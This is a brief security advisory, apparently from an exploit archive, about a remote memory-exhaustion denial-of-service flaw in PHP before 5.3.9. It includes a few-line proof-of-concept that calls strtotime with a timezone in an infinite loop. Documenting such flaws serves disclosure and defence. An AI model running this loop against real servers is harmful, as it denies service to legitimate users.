source: http://www.securityfocus.com/bid/52043/info

PHP is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to exhaust available memory, denying access to legitimate users.

PHP versions prior to 5.3.9 are vulnerable. 

<?php
while (true)
{
strtotime('Monday 00:00 Europe/Paris'); // Memory leak
}
?> 